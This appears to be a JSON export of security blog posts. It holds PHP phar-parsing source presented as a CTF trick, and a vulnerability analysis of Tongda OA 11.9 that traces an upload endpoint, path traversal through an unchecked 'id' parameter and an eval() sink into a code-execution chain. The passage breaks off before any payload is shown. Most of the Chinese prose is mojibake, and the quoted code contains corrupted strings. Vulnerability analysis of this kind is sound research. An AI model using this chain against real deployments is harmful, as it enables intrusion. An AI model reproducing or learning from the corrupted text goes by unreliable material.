file_handle-&gt;handle.stream.handle  = phar;                file_handle-&gt;handle.stream.reader  = phar_zend_stream_reader;                file_handle-&gt;handle.stream.closer  = NULL;                file_handle-&gt;handle.stream.fsizer  = phar_zend_stream_fsizer;                file_handle-&gt;handle.stream.isatty  = 0;                phar-&gt;is_persistent ?                    php_stream_rewind(PHAR_G(cached_fp)[phar-&gt;phar_pos].fp) :                    php_stream_rewind(phar-&gt;fp);            &#125;        &#125;    &#125;    zend_try &#123;        failed = 0;        CG(zend_lineno) = 0;        res = phar_orig_compile_file(file_handle, type);    &#125; zend_catch &#123;        failed = 1;        res = NULL;    &#125; zend_end_try();    if (name) &#123;        efree(name);    &#125;    if (failed) &#123;        zend_bailout();    &#125;    return res;&#125;\n\nåˆ¤æ–­çš„æ¡ä»¶\nif (strstr(file_handle-&gt;filename, &quot;.phar&quot;) &amp;&amp; !strstr(file_handle-&gt;filename, &quot;://&quot;))\n\né¦–å…ˆæ£€æŸ¥æ–‡ä»¶çš„æ‹“å±•åæ˜¯ä¸æ˜¯.phar,å†çœ‹æ˜¯ä¸æ˜¯ä»¥phar://åè®®å­˜åœ¨,å¦‚æœéƒ½ä¸å­˜åœ¨çš„è¯,åˆ™è®¤ä¸ºå®ƒæ˜¯æœ¬åœ°çš„pharæ–‡ä»¶\næ‰€ä»¥åªè¦æ˜¯å¸¦æœ‰pharå­—ç¬¦,ä¾‹å¦‚1.phar.jpgéƒ½æ˜¯å¯ä»¥çš„\nå…³é”®æ˜¯ä¸‹é¢çš„ä»£ç \nä½¿ç”¨çš„ phar_open_from_filename å»å¤„ç†\nif (SUCCESS == phar_open_from_filename(ZSTR_VAL(file_handle-&gt;filename), ZSTR_LEN(file_handle-&gt;filename), NULL, 0, 0, &amp;phar, NULL)) &#123;\t\t\tif (phar-&gt;is_zip || phar-&gt;is_tar) &#123;\t\t\t\tzend_file_handle f;\t\t\t\t/* zip or tar-based phar */\t\t\t\tname = zend_strpprintf(4096, &quot;phar://%s/%s&quot;, ZSTR_VAL(file_handle-&gt;filename), &quot;.phar/stub.php&quot;);\t\t\t\tzend_stream_init_filename_ex(&amp;f, name);\t\t\t\tif (SUCCESS == zend_stream_open_function(&amp;f)) &#123;\t\t\t\t\tzend_string_release(f.filename);\t\t\t\t\tf.filename = file_handle-&gt;filename;\t\t\t\t\tif (f.opened_path) &#123;\t\t\t\t\t\tzend_string_release(f.opened_path);\t\t\t\t\t&#125;\t\t\t\t\tf.opened_path = file_handle-&gt;opened_path;\n\nè¯»å–æ–‡ä»¶å†…å®¹:\nint phar_open_from_filename(char *fname, size_t fname_len, char *alias, size_t alias_len, uint32_t options, phar_archive_data** pphar, char **error) /* &#123;&#123;&#123; */&#123;    php_stream *fp;    zend_string *actual;    int ret, is_data = 0;    if (error) &#123;        *error = NULL;    &#125;    if (!strstr(fname, &quot;.phar&quot;)) &#123;        is_data = 1;    &#125;    if (phar_open_parsed_phar(fname, fname_len, alias, alias_len, is_data, options, pphar, error) == SUCCESS) &#123;        return SUCCESS;    &#125; else if (error &amp;&amp; *error) &#123;        return FAILURE;    &#125;    if (php_check_open_basedir(fname)) &#123;        return FAILURE;    &#125;    fp = php_stream_open_wrapper(fname, &quot;rb&quot;, IGNORE_URL|STREAM_MUST_SEEK, &amp;actual);    if (!fp) &#123;        if (options &amp; REPORT_ERRORS) &#123;            if (error) &#123;                spprintf(error, 0, &quot;unable to open phar for reading \\&quot;%s\\&quot;&quot;, fname);            &#125;        &#125;        if (actual) &#123;            zend_string_release_ex(actual, 0);        &#125;        return FAILURE;    &#125;    if (actual) &#123;        fname = ZSTR_VAL(actual);        fname_len = ZSTR_LEN(actual);    &#125;    ret =  phar_open_from_fp(fp, fname, fname_len, alias, alias_len, options, pphar, is_data, error);    if (actual) &#123;        zend_string_release_ex(actual, 0);    &#125;    return ret;&#125;\n\nphar_open_from_fpï¼š\nstatic int phar_open_from_fp(php_stream* fp, char *fname, size_t fname_len, char *alias, size_t alias_len, uint32_t options, phar_archive_data** pphar, int is_data, char **error) /* &#123;&#123;&#123; */&#123;    const char token[] = &quot;__HALT_COMPILER();&quot;;    const char zip_magic[] = &quot;PK\\x03\\x04&quot;;    const char gz_magic[] = &quot;\\x1f\\x8b\\x08&quot;;    const char bz_magic[] = &quot;BZh&quot;;    char *pos, test = &#x27;\\0&#x27;;    const int window_size = 1024;    char buffer[1024 + sizeof(token)]; /* a 1024 byte window + the size of the halt_compiler token (moving window) */    const zend_long readsize = sizeof(buffer) - sizeof(token);    const zend_long tokenlen = sizeof(token) - 1;    zend_long halt_offset;    size_t got;    uint32_t compression = PHAR_FILE_COMPRESSED_NONE;    if (error) &#123;        *error = NULL;    &#125;    if (-1 == php_stream_rewind(fp)) &#123;        MAPPHAR_ALLOC_FAIL(&quot;cannot rewind phar \\&quot;%s\\&quot;&quot;)    &#125;    buffer[sizeof(buffer)-1] = &#x27;\\0&#x27;;    memset(buffer, 32, sizeof(token));    halt_offset = 0;    /* Maybe it&#x27;s better to compile the file instead of just searching,  */    /* but we only want the offset. So we want a .re scanner to find it. */    while(!php_stream_eof(fp)) &#123;        if ((got = php_stream_read(fp, buffer+tokenlen, readsize)) &lt; (size_t) tokenlen) &#123;            MAPPHAR_ALLOC_FAIL(&quot;internal corruption of phar \\&quot;%s\\&quot; (truncated entry)&quot;)        &#125;        if (!test) &#123;            test = &#x27;\\1&#x27;;            pos = buffer+tokenlen;            if (!memcmp(pos, gz_magic, 3)) &#123;                char err = 0;                php_stream_filter *filter;                php_stream *temp;                /* to properly decompress, we have to tell zlib to look for a zlib or gzip header */                zval filterparams;                if (!PHAR_G(has_zlib)) &#123;                    MAPPHAR_ALLOC_FAIL(&quot;unable to decompress gzipped phar archive \\&quot;%s\\&quot; to temporary file, enable zlib extension in php.ini&quot;)                &#125;                array_init(&amp;filterparams);/* this is defined in zlib&#x27;s zconf.h */#ifndef MAX_WBITS#define MAX_WBITS 15#endif                add_assoc_long_ex(&amp;filterparams, &quot;window&quot;, sizeof(&quot;window&quot;) - 1, MAX_WBITS + 32);                /* entire file is gzip-compressed, uncompress to temporary file */                if (!(temp = php_stream_fopen_tmpfile())) &#123;                    MAPPHAR_ALLOC_FAIL(&quot;unable to create temporary file for decompression of gzipped phar archive \\&quot;%s\\&quot;&quot;)                &#125;                php_stream_rewind(fp);                filter = php_stream_filter_create(&quot;zlib.inflate&quot;, &amp;filterparams, php_stream_is_persistent(fp));                if (!filter) &#123;                    err = 1;                    add_assoc_long_ex(&amp;filterparams, &quot;window&quot;, sizeof(&quot;window&quot;) - 1, MAX_WBITS);                    filter = php_stream_filter_create(&quot;zlib.inflate&quot;, &amp;filterparams, php_stream_is_persistent(fp));                    zend_array_destroy(Z_ARR(filterparams));                    if (!filter) &#123;                        php_stream_close(temp);                        MAPPHAR_ALLOC_FAIL(&quot;unable to decompress gzipped phar archive \\&quot;%s\\&quot;, ext/zlib is buggy in PHP versions older than 5.2.6&quot;)                    &#125;                &#125; else &#123;                    zend_array_destroy(Z_ARR(filterparams));                &#125;                php_stream_filter_append(&amp;temp-&gt;writefilters, filter);                if (SUCCESS != php_stream_copy_to_stream_ex(fp, temp, PHP_STREAM_COPY_ALL, NULL)) &#123;                    if (err) &#123;                        php_stream_close(temp);                        MAPPHAR_ALLOC_FAIL(&quot;unable to decompress gzipped phar archive \\&quot;%s\\&quot;, ext/zlib is buggy in PHP versions older than 5.2.6&quot;)                    &#125;                    php_stream_close(temp);                    MAPPHAR_ALLOC_FAIL(&quot;unable to decompress gzipped phar archive \\&quot;%s\\&quot; to temporary file&quot;)                &#125;                php_stream_filter_flush(filter, 1);                php_stream_filter_remove(filter, 1);                php_stream_close(fp);                fp = temp;                php_stream_rewind(fp);                compression = PHAR_FILE_COMPRESSED_GZ;                /* now, start over */                test = &#x27;\\0&#x27;;                continue;            &#125; else if (!memcmp(pos, bz_magic, 3)) &#123;                php_stream_filter *filter;                php_stream *temp;                if (!PHAR_G(has_bz2)) &#123;                    MAPPHAR_ALLOC_FAIL(&quot;unable to decompress bzipped phar archive \\&quot;%s\\&quot; to temporary file, enable bz2 extension in php.ini&quot;)                &#125;                /* entire file is bzip-compressed, uncompress to temporary file */                if (!(temp = php_stream_fopen_tmpfile())) &#123;                    MAPPHAR_ALLOC_FAIL(&quot;unable to create temporary file for decompression of bzipped phar archive \\&quot;%s\\&quot;&quot;)                &#125;                php_stream_rewind(fp);                filter = php_stream_filter_create(&quot;bzip2.decompress&quot;, NULL, php_stream_is_persistent(fp));                if (!filter) &#123;                    php_stream_close(temp);                    MAPPHAR_ALLOC_FAIL(&quot;unable to decompress bzipped phar archive \\&quot;%s\\&quot;, filter creation failed&quot;)                &#125;                php_stream_filter_append(&amp;temp-&gt;writefilters, filter);                if (SUCCESS != php_stream_copy_to_stream_ex(fp, temp, PHP_STREAM_COPY_ALL, NULL)) &#123;                    php_stream_close(temp);                    MAPPHAR_ALLOC_FAIL(&quot;unable to decompress bzipped phar archive \\&quot;%s\\&quot; to temporary file&quot;)                &#125;                php_stream_filter_flush(filter, 1);                php_stream_filter_remove(filter, 1);                php_stream_close(fp);                fp = temp;                php_stream_rewind(fp);                compression = PHAR_FILE_COMPRESSED_BZ2;                /* now, start over */                test = &#x27;\\0&#x27;;                continue;            &#125;            if (!memcmp(pos, zip_magic, 4)) &#123;                php_stream_seek(fp, 0, SEEK_END);                return phar_parse_zipfile(fp, fname, fname_len, alias, alias_len, pphar, error);            &#125;            if (got &gt; 512) &#123;                if (phar_is_tar(pos, fname)) &#123;                    php_stream_rewind(fp);                    return phar_parse_tarfile(fp, fname, fname_len, alias, alias_len, pphar, is_data, compression, error);                &#125;            &#125;        &#125;        if (got &gt; 0 &amp;&amp; (pos = phar_strnstr(buffer, got + sizeof(token), token, sizeof(token)-1)) != NULL) &#123;            halt_offset += (pos - buffer); /* no -tokenlen+tokenlen here */            return phar_parse_pharfile(fp, fname, fname_len, alias, alias_len, halt_offset, pphar, compression, error);        &#125;        halt_offset += got;        memmove(buffer, buffer + window_size, tokenlen); /* move the memory buffer by the size of the window */    &#125;    MAPPHAR_ALLOC_FAIL(&quot;internal corruption of phar \\&quot;%s\\&quot; (__HALT_COMPILER(); not found)&quot;)&#125;\t\n\nå¯¹è¿™ä¸¤ä¸ªå‡½æ•°æ€»ç»“:\n\nä»æ–‡ä»¶æŒ‡é’ˆ fp æ‰“å¼€ä¸€ä¸ª .phar æ–‡ä»¶å¹¶è§£æå…¶ç»“æ„ï¼Œè¯†åˆ«æ ¼å¼ï¼ˆphar&#x2F;tar&#x2F;zip&#x2F;gz&#x2F;bz2ï¼‰ï¼Œæ‰¾åˆ° __HALT_COMPILER();ï¼Œå¹¶åˆå§‹åŒ– phar_archive_dataã€‚\nå®ƒå¯ä»¥å»è§£æå„ç§å‹ç¼©çš„å½¢å¼ï¼Œæœ€åå¦‚æœæ•´ä¸ªæ–‡ä»¶éƒ½æ²¡æ‰¾åˆ° __HALT_COMPILER();ï¼Œå°±æŠ¥é”™\nå¦‚æœæ£€æµ‹åˆ° zip magicï¼Œäº¤ç”± phar_parse_zipfile() æ¥å¤„ç†\nå¦‚æœæ–‡ä»¶ç»“æ„åƒ TARï¼Œå°±ä½¿ç”¨ phar_parse_tarfile() è§£æã€‚\n\nå°±æ˜¯æ— è®ºæ€ä¹ˆå‹ç¼©,å‡½æ•°éƒ½ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬è§£å‹,gzæ–‡ä»¶ä¹Ÿä¸ä¾‹å¤–\n","categories":["php ctf_tricks"],"tags":["php phar phpååºåˆ—åŒ–"]},{"title":"é€šè¾¾OA11.9æ¼æ´åˆ†æ","url":"/2025/09/23/%E9%80%9A%E8%BE%BEOA11-9%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"å‡†å¤‡å·¥ä½œæºç ä¸‹è½½åœ°å€:https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe\nç„¶åå‡†å¤‡å¥½è§£å¯†å·¥å…·:SeayDzend.exe\næ¼æ´åˆ†æå‰å°æ–‡ä»¶ä¸Šä¼ ç‚¹æ–‡ä»¶ä½ç½®:/mobile/api/api.ali.php,ä»£ç å¦‚ä¸‹:\n&lt;?phpinclude_once &quot;inc/conn.php&quot;;include_once &quot;inc/td_ali/api.ali.class.php&quot;;include_once &quot;inc/utility_file.php&quot;;$ATTACHMENTS = upload(&quot;file&quot;, &quot;approve_center&quot;);if (is_array($ATTACHMENTS)) &#123;\t$id = rtrim($ATTACHMENTS[&quot;ID&quot;], &quot;,&quot;);\t$name = rtrim($ATTACHMENTS[&quot;NAME&quot;], &quot;*&quot;);\t$FILE_PATH = attach_real_path($id, $name);\t$FILE_PATH = str_replace(&quot;\\\\&quot;, &quot;/&quot;, $FILE_PATH);\t$image = file_get_contents($FILE_PATH);\t$AliOrc = new AliOrc();\t$data = $AliOrc-&gt;vat_invoice($image);\techo $data;&#125;?&gt;\n\nè·Ÿè¿›ä¸€ä¸‹uploadå‡½æ•°\nunction upload($PREFIX, $MODULE, $OUTPUT)&#123;\tif (strstr($MODULE, &quot;/&quot;) || strstr($MODULE, &quot;\\\\&quot;)) &#123;\t\tif (!$OUTPUT) &#123;\t\t\treturn _(&quot;???????ï¿½ï¿½???????&quot;);\t\t&#125;\t\tMessage(_(&quot;????&quot;), _(&quot;???????ï¿½ï¿½???????&quot;));\t\texit();\t&#125;\t$ATTACHMENTS = array(&quot;ID&quot; =&gt; &quot;&quot;, &quot;NAME&quot; =&gt; &quot;&quot;);\treset($_FILES);\tforeach ($_FILES as $KEY =&gt; $ATTACHMENT ) &#123;\t\tif (($ATTACHMENT[&quot;error&quot;] == 4) || (($KEY != $PREFIX) &amp;&amp; (substr($KEY, 0, strlen($PREFIX) + 1) != $PREFIX . &quot;_&quot;))) &#123;\t\t\tcontinue;\t\t&#125;\t\t$data_charset = (isset($_GET[&quot;data_charset&quot;]) ? $_GET[&quot;data_charset&quot;] : (isset($_POST[&quot;data_charset&quot;]) ? $_POST[&quot;data_charset&quot;] : &quot;&quot;));\t\t$ATTACH_NAME = ($data_charset != &quot;&quot; ? td_iconv($ATTACHMENT[&quot;name&quot;], $data_charset, MYOA_CHARSET) : $ATTACHMENT[&quot;name&quot;]);\t\t$ATTACH_NAME = filename_valid($ATTACH_NAME);\t\t$ATTACH_SIZE = $ATTACHMENT[&quot;size&quot;];\t\t$ATTACH_ERROR = $ATTACHMENT[&quot;error&quot;];\t\t$ATTACH_FILE = $ATTACHMENT[&quot;tmp_name&quot;];\t\t$ERROR_DESC = &quot;&quot;;\t\tif ($ATTACH_ERROR == UPLOAD_ERR_OK) &#123;\t\t\tif (!is_uploadable($ATTACH_NAME)) &#123;\t\t\t\t$ERROR_DESC = sprintf(_(&quot;????????????[%s]?????&quot;), substr($ATTACH_NAME, strrpos($ATTACH_NAME, &quot;.&quot;) + 1));\t\t\t&#125;\t\t\t$encode = mb_detect_encoding($ATTACH_NAME, array(&quot;ASCII&quot;, &quot;UTF-8&quot;, &quot;GB2312&quot;, &quot;GBK&quot;, &quot;BIG5&quot;));\t\t\tif ($encode != &quot;UTF-8&quot;) &#123;\t\t\t\t$ATTACH_NAME_UTF8 = mb_convert_encoding($ATTACH_NAME, &quot;utf-8&quot;, $encode);\t\t\t&#125;\t\t\telse &#123;\t\t\t\t$ATTACH_NAME_UTF8 = $ATTACH_NAME;\t\t\t&#125;\t\t\tif (preg_match(&quot;/[\\&#x27;:&lt;&gt;?]|\\/|\\\\\\\\|\\&quot;|\\|/u&quot;, $ATTACH_NAME_UTF8)) &#123;\t\t\t\t$ERROR_DESC = sprintf(_(&quot;?????[%s]????[/\\&#x27;\\&quot;:*?&lt;&gt;|]???????&quot;), $ATTACH_NAME);\t\t\t&#125;\t\t\tif ($ATTACH_SIZE == 0) &#123;\t\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]??ï¿½ï¿½?0???&quot;), $ATTACH_NAME);\t\t\t&#125;\t\t\tif ($ERROR_DESC == &quot;&quot;) &#123;\t\t\t\t$ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);\t\t\t\tif ($ATTACH_ID === false) &#123;\t\t\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]??????&quot;), $ATTACH_NAME);\t\t\t\t&#125;\t\t\t\telse &#123;\t\t\t\t\t$ATTACHMENTS[&quot;ID&quot;] .= $ATTACH_ID . &quot;,&quot;;\t\t\t\t\t$ATTACHMENTS[&quot;NAME&quot;] .= $ATTACH_NAME . &quot;*&quot;;\t\t\t\t&#125;\t\t\t&#125;\t\t\t@td_unlink(ATTACH_FILE);\t\t&#125;\t\telse if ($ATTACH_ERROR == UPLOAD_ERR_INI_SIZE) &#123;\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]???ï¿½ï¿½?????????????%s??&quot;), $ATTACH_NAME, ini_get(&quot;upload_max_filesize&quot;));\t\t&#125;\t\telse if ($ATTACH_ERROR == UPLOAD_ERR_FORM_SIZE) &#123;\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]???ï¿½ï¿½????????????&quot;), $ATTACH_NAME);\t\t&#125;\t\telse if ($ATTACH_ERROR == UPLOAD_ERR_PARTIAL) &#123;\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]?????????&quot;), $ATTACH_NAME);\t\t&#125;\t\telse if ($ATTACH_ERROR == UPLOAD_ERR_NO_TMP_DIR) &#123;\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]????????????????????&quot;), $ATTACH_NAME);\t\t&#125;\t\telse if ($ATTACH_ERROR == UPLOAD_ERR_CANT_WRITE) &#123;\t\t\t$ERROR_DESC = sprintf(_(&quot;???[%s]ï¿½ï¿½?????&quot;), $ATTACH_NAME);\t\t&#125;\t\telse &#123;\t\t\t$ERROR_DESC = sprintf(_(&quot;ï¿½ï¿½?????[????%s]&quot;), $ATTACH_ERROR);\t\t&#125;\t\tif ($ERROR_DESC != &quot;&quot;) &#123;\t\t\tif (!$OUTPUT) &#123;\t\t\t\tdelete_attach($ATTACHMENTS[&quot;ID&quot;], $ATTACHMENTS[&quot;NAME&quot;], $MODULE);\t\t\t\treturn $ERROR_DESC;\t\t\t&#125;\t\t\telse &#123;\t\t\t\tMessage(_(&quot;????&quot;), $ERROR_DESC);\t\t\t\texit();\t\t\t&#125;\t\t&#125;\t&#125;\treturn $ATTACHMENTS;&#125;\n\næœ‰äº›ç¼–ç é—®é¢˜ä¸çŸ¥é“å•¥æƒ…å†µ,è½¬æ¢ä¸€ä¸‹ç›´æ¥æŠŠä¹±ç å˜æˆé—®å·äº†\nå†è·Ÿè¿›ä¸€ä¸‹is_uploadableå‡½æ•°\nfunction is_uploadable($FILE_NAME, $checkpath, $func_name)&#123;\t$EXT_NAME = &quot;&quot;;\t$POS = strrpos($FILE_NAME, &quot;.&quot;);\tif ($POS === false) &#123;\t\t$EXT_NAME = $FILE_NAME;\t&#125;\telse &#123;\t\t$EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));\t\t$EXT_NAME = filename_valid($EXT_NAME);\t\tif ((td_trim($EXT_NAME) == &quot;&quot;) || (td_trim(strtolower(substr($EXT_NAME, 0, 3))) == &quot;php&quot;)) &#123;\t\t\treturn false;\t\t&#125;\t&#125;\tif ($checkpath &amp;&amp; !td_path_valid($FILE_NAME, $func_name)) &#123;\t\treturn false;\t&#125;\tif (find_id(MYOA_UPLOAD_FORBIDDEN_TYPE, $EXT_NAME)) &#123;\t\treturn false;\t&#125;\tif (MYOA_UPLOAD_LIMIT == 0) &#123;\t\treturn true;\t&#125;\telse if (MYOA_UPLOAD_LIMIT == 1) &#123;\t\treturn !find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);\t&#125;\telse if (MYOA_UPLOAD_LIMIT == 2) &#123;\t\treturn find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);\t&#125;\telse &#123;\t\treturn false;\t&#125;&#125;\n\nå¯ä»¥çœ‹åˆ°ä¼šæ£€æŸ¥ä¸Šä¼ çš„æ–‡ä»¶çš„åç¼€æ˜¯ä¸æ˜¯php,æˆ‘ä»¬åœ¨æœ¬åœ°å‘é€ä¸ªåŒ…çœ‹çœ‹(å›¾æ˜¯å·çš„,æœ¬åœ°èµ·ä¸äº†ç¯å¢ƒ)\n\nå…¶ä¸­2203æ˜¯å–çš„æ—¥æœŸ,åé¢ä¸€ä¸²æ˜¯éšæœºçš„å­—ç¬¦ä¸²,çœ‹ä¸€ä¸‹æ˜¯åœ¨å“ªé‡Œç”Ÿæˆçš„è¿™ä¸²å­—ç¬¦ä¸²\nå®šä½åˆ°add_attachå‡½æ•°\nif (!file_exists($SOURCE_FILE)) &#123;\treturn false;&#125;if ($MODULE == &quot;&quot;) &#123;\t$MODULE = attach_sub_dir();&#125;if ($YM == &quot;&quot;) &#123;\t$YM = date(&quot;ym&quot;);&#125;$PATH = $ATTACH_PATH_ACTIVE . $MODULE;if (!file_exists($PATH) || !is_dir($PATH)) &#123;\t@mkdir($PATH, 448);&#125;$PATH = $PATH . &quot;/&quot; . $YM;if (!file_exists($PATH) || !is_dir($PATH)) &#123;\t@mkdir($PATH, 448);&#125;$ATTACH_NAME = (is_default_charset($ATTACH_NAME) ? $ATTACH_NAME : iconv(&quot;utf-8&quot;, \t\tMYOA_CHARSET, $ATTACH_NAME));$EXT_NAME = substr($ATTACH_NAME, strrpos($ATTACH_NAME, &quot;.&quot;));$ATTACH_NAME = str_replace($EXT_NAME, strtolower($EXT_NAME), $ATTACH_NAME);$ATTACH_FILE = (MYOA_ATTACH_NAME_FORMAT ? md5($ATTACH_NAME) . &quot;.td&quot; : $ATTACH_NAME);$ATTACH_ID = mt_rand();$FILENAME = $PATH . &quot;/&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;if (file_exists($FILENAME)) &#123;\t$ATTACH_ID = mt_rand();\t$FILENAME = $PATH . &quot;/&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;&#125;\n\næœ€åçš„ç›®å½•å°±é•¿è¿™æ ·:\n$PATH = $PATH . &quot;/&quot; . $YM;$ATTACH_ID = mt_rand()$PATH . &quot;/&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE\n\nevalå‡½æ•°å‚æ•°å¯æ§æ–‡ä»¶å®šä½:inc\\package\\business\\AllVariableBusinessProcessing.php\n\næ‰‹åŠ¨è¡¥äº†ä¸ªæ‹¬å·,çœ‹çœ‹ä»£ç \n$variableData = eval(&quot;return &quot; . iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, var_export($variableData, true) . &quot;;&quot;));\n\nè¿™è¡Œä»£ç çš„ä½œç”¨æ˜¯å°†å˜é‡ $variableDataçš„æ•°æ®ä» UTF-8 ç¼–ç è½¬æ¢ä¸º GBK ç¼–ç ï¼Œå¹¶ä¸”é€šè¿‡ evalå‡½æ•°æ‰§è¡Œè½¬æ¢åçš„å­—ç¬¦ä¸²\n$variableDataå˜é‡æ˜¯è¿™ä¸ªbackDataAnalysisæ–¹æ³•ä¼ è¿›æ¥çš„å‚æ•°,å­˜åœ¨å¯æ§ç‚¹,å†çœ‹çœ‹æœ‰å“ªé‡Œç”¨äº†è¿™ä¸ªæ–¹æ³•\n\nåœ¨inc\\package\\DataTransport.phpçš„backData()æ–¹æ³•ä¸­è°ƒç”¨äº†backDataAnalysis()æ–¹æ³•ï¼Œè€Œåœ¨acceptData()æ–¹æ³•ä¸­è°ƒç”¨äº†backData()æ–¹æ³•ï¼Œç»§ç»­çœ‹acceptData()æ–¹æ³•çš„ä»£ç \npublic function backData($backData)&#123;\t$modular = $backData[&quot;modular&quot;];\tinclude_once &quot;inc/package/business/&quot; . $modular . &quot;BusinessProcessing.php&quot;;\t$BusinessProcess = $modular . &quot;BusinessProcessing&quot;;\t$BusinessProcessing = new $BusinessProcess();\t$organizeData = $BusinessProcessing-&gt;backDataAnalysis($backData);&#125;\n\npublic function acceptData($id)\t&#123;\t\t$json_file = MYOA_ATTACH_PATH2 . &quot;syn/recv/data/&quot; . $id . &quot;/&quot; . $id . &quot;.json&quot;;\t\t$data = $this-&gt;analysisJson($json_file);\t\t$query = &quot;select * from file_transfer_address where system_address =&#x27;&quot; . $data[&quot;send_url&quot;] . &quot;&#x27;&quot;;\t\t$cursor = exequery(TD::conn(), $query);\t\tif ($ROW = mysql_fetch_array($cursor)) &#123;\t\t\t$receive = $ROW[&quot;id&quot;];\t\t&#125;\t\tif ($data[&quot;type&quot;] == &quot;send&quot;) &#123;\t\t\t$modular = $data[&quot;modular&quot;];\t\t\tinclude_once &quot;inc/package/business/&quot; . $modular . &quot;BusinessProcessing.php&quot;;\t\t\t$BusinessProcess = $modular . &quot;BusinessProcessing&quot;;\t\t\t$BusinessProcessing = new $BusinessProcess();\t\t\t$new_file = MYOA_ATTACH_PATH2 . &quot;syn/recv/data/&quot; . $id;\t\t\t$data[&quot;fileAddress&quot;] = $this-&gt;getFile($id, $data[&quot;fileList&quot;]);\t\t\t$new_data = json_decode($data[&quot;organizeData&quot;], true);\t\t\t$new_data[&quot;fileAddress&quot;] = $data[&quot;fileAddress&quot;];\t\t\t$new_data[&quot;send&quot;] = $receive;\t\t\t$new_data[&quot;receive&quot;] = $receive;\t\t\t$new_data = json_encode($new_data);\t\t\t$dataAnalysis = $BusinessProcessing-&gt;dataAnalysis($new_data);\t\t\tif ($dataAnalysis) &#123;\t\t\t\t$runId = $data[&quot;Id&quot;];\t\t\t\t$query = &quot;select * from file_transfer_address where id = &#x27;999&#x27;&quot;;\t\t\t\t$cursor = exequery(TD::conn(), $query);\t\t\t\tif ($ROW = mysql_fetch_array($cursor)) &#123;\t\t\t\t\t$send_url = $ROW[&quot;system_address&quot;];\t\t\t\t&#125;\t\t\t\t$backData = array(&quot;id&quot; =&gt; $data[&quot;id&quot;], &quot;type&quot; =&gt; &quot;back&quot;, &quot;send_url&quot; =&gt; $send_url, &quot;send&quot; =&gt; $receive, &quot;receive&quot; =&gt; $receive, &quot;modular&quot; =&gt; $modular, &quot;dataAnalysis&quot; =&gt; $dataAnalysis);\t\t\t\t$json_file = $this-&gt;makeJson($backData);\t\t\t\t$redis = TRedis::redis();\t\t\t\t$message = array(&quot;json&quot; =&gt; $json_file, &quot;netid&quot; =&gt; $receive);\t\t\t\t$redis-&gt;hmset(&quot;syn:send:data:&quot; . $id, $message);\t\t\t\t$time = time();\t\t\t\t$redis-&gt;zadd(&quot;syn:orig:list&quot;, $time, $id);\t\t\t&#125;\t\t&#125;\t\telse &#123;\t\t\t$data[&quot;send&quot;] = $receive;\t\t\t$data[&quot;receive&quot;] = $receive;\t\t\t$this-&gt;backData($data);//åœ¨è¿™é‡Œ\t\t&#125;\t\treturn &quot;+OK&quot;;\t&#125;\n\nå…³æ³¨è¿™å‡ è¡Œä»£ç :\npublic function acceptData($id)   &#123;       $json_file = MYOA_ATTACH_PATH2 . &quot;syn/recv/data/&quot; . $id . &quot;/&quot; . $id . &quot;.json&quot;;       $data = $this-&gt;analysisJson($json_file);       ......       $this-&gt;backData($data);&#125;\n\nè€Œåœ¨/inc/package/work.phpåˆè°ƒç”¨äº†acceptData()æ–¹æ³•,è·Ÿè¿›çœ‹çœ‹\n&lt;?phpinclude_once &quot;inc/conn.php&quot;;include_once &quot;inc/utility_all.php&quot;;include_once &quot;inc/utility_file.php&quot;;include_once &quot;inc/TRedis/TRedis.php&quot;;$id = $_GET[&quot;id&quot;];include_once &quot;DataTransport.php&quot;;$DataTransport = new DataTransport();$state = $DataTransport-&gt;acceptData($id);echo $state;?&gt;\n\nå¯ä»¥å‘ç°è¿™é‡Œçš„idæ˜¯ç”±GETæ–¹æ³•ä¼ è¿›æ¥çš„,å¹¶æ²¡æœ‰ä»»ä½•æ ¡éªŒ,ç›´æ¥æ‹¼æ¥åˆ°acceptDataæ–¹æ³•ä¸­\nå…¶ä¸­$idç›´æ¥ä¼ å…¥åˆ°è¯­å¥ä¸­ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œå¯ä»¥è¯»å–ä»»æ„åœ°æ–¹çš„ json æ–‡ä»¶ç„¶åè¿›è¡Œ json æ ¼å¼è§£ç åèµ‹å€¼ç»™$data\nè¿™é‡Œå°±å’Œå‰é¢çš„æ–‡ä»¶ä¸Šä¼ ç»„åˆèµ·æ¥æ„æˆä¸€æ¡åˆ©ç”¨é“¾ï¼Œå‰©ä¸‹çš„å°±æ˜¯è¦æ„é€ ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹,å†æ‹ä¸€ä¸‹ä¹‹å‰çš„åˆ©ç”¨é“¾,å‰©ä¸‹çš„å°±æ˜¯è¦æ„é€ ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹ã€‚\n$idå¯æ§-&gt;å¯è¯»å–ä»»æ„ç›®å½•ä¸‹çš„jsonæ–‡ä»¶-&gt;å°†å¤„ç†åçš„jsonäº¤ç»™inc\\package\\business\\AllVariableBusinessProcessing.phpä¸­çš„evalå‡½æ•°å¤„ç†\n\nå›åˆ°eval()å‡½æ•°ç‚¹\n$variableData = eval(&quot;return &quot; . iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, var_export($variableData, true) . &quot;;&quot;));\n\né‡ç‚¹æ³¨æ„è¿™å‡ è¡Œä»£ç å³å¯\nstatic public function backDataAnalysis($BackData)\t&#123;\t\t$variableData = $BackData[&quot;dataAnalysis&quot;];\t\t$variableData = json_decode($variableData, true);\t\t$variableData = eval(&quot;return &quot; . iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, var_export($variableData, true) . &quot;;&quot;));\n\nå› 